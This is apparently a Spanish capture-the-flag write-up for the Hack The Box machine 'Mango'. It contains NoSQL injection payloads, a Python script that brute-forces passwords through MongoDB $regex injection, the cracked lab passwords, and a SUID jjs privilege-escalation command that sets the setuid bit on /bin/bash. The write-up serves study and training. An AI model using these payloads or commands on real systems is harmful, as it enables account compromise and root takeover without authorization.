---
layout: post
title:  "Maquina Retirada Mango de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MANGO
tags: HTB, Bypass, NoSQLI, Mongo-db, JJS, Web Hacking, Maquinas Retiradas, Writeup
---

# Mango ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.162       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: 10.10.10.162; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos un dominio 

Usamos la herramienta whatweb
```bash
# whatweb 10.10.10.162                                                                                                                                                                                        1 ⚙
http://10.10.10.162 [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.162], Title[403 Forbidden]
```
Nos arroja un Forbidden y si probamos con el dominio encontrado?
```bash
# whatweb staging-order.mango.htb                                                                                                                                                                             
http://staging-order.mango.htb/ [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.162], PasswordField[password], Script, Title[Mango | Sweet & Juicy]
```
Nos arroja mas informacion.

Vemos que Tenemos un Login, probamos las tipicas injecciones de SQLI y vemos que no nos respode a ninguna.. 
Buscamos informacion sobre las bases de datos `Mongo-db`
Vemos que justo para las bases de datos `Mongo-db` hay unas injecciones llamadas `NoSqli`.

Injeccion No Sqli
```bash
username[$regex]=^a.*$&password[$ne]=lol&login=login    --- codigo 302
```
Averiguamos la longitud de la contraseña para el usuario `admin`: `username=admin&password[$regex]=^.{12}$&login=login   ----302`

Averiguarmos la longitud de la contraseña para el usuario `mango`: `pusername=mango&password[$regex]=^.{16}$&login=login ------- 302`

Conseguimos sacar dos usuarios validos: `admin , mango`

Nos montamos un `exploit` en python3 para sacar las contraseñas de los dos usuarios enumerados de la misma forma.
```python3
#!/usr/bin/python3

import requests
import re
import signal
import sys
import pdb
import string
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://staging-order.mango.htb"
s = string.ascii_letters + string.digits + string.punctuation 

def makeRequest():

    password = ""

    for i in range(0, 20):

        for character in s:

            p1.status("Probando el caracter %s" % character)

            post_data = {
                'username': 'admin',
                'password[$regex]': '^%s.*$' % (re.escape(password + character)),
                'login': 'login'
            }

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Password")
    time.sleep(2)

    makeRequest()
```
Lanzamos este exploit para sacar las passwords
Para el user `mango`:
```bash
# python3 Mango_NoSQLI.py                                                                                                                                                                                     
[↙] Fuerza bruta: Probando el caracter ~
[◒] Password: h3mXK8RhU~f{]f5H
```
Para el user `admin`:
```bash
# python3 Mango_NoSQLI.py                                                                                                                                                       

[..\.....] Fuerza bruta: Probando el caracter ~
[◥] Password: t9KcS3>!0B#2
```

# Accediendo por el SSH con las Credenciales Obtenidas
Teniendo las credenciales de la base de datos podriamos probar a conectarnos por el servicio `ssh` con las `passwords` encontradas.
```bash
mango@mango:~$ whoami
mango

mango@mango:/home$ ls
admin  mango

mango@mango:/home/admin$ ls
user.txt

```
ernumeramos el sistema:
```bash
mango@mango:/$ find / -group admin -type f 2>/dev/null
/var/crash/_usr_bin_pkttyagent.4000000000.crash
/home/admin/.bash_logout
/home/admin/.profile
/home/admin/.bashrc
/home/admin/user.txt
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-rwsr-sr-- 1 root  admin  10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```
Como nosotros teniamos la password encontrada del usuario `Admin` podemos probar a hacer un cambio de usuario con el comando `su`.
Vemos que lo hacemos sin problema y conseguimos la flag de `user.txt`.

# Escalada de privilegios mediante el Binario SUID jjs
Con el binario SUID encontrado de jjs nos dirigimos como siempre a la pagina de GTFOBins y chequeamos por `jjs` y permisos SUID:
```bash
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs ``
```
Para Hacerlo de una manera mas sencilla, nos abrimos una session interactiva y modificamos un poco el comando a introducir:
- La Modificamos ya que estamos en una session interactiva de jjs -
```bash
$ Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()

$ Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
```
Introducimos la sentencia en `java` y conseguimos `root`
Maquina Rooteada =) KOHack

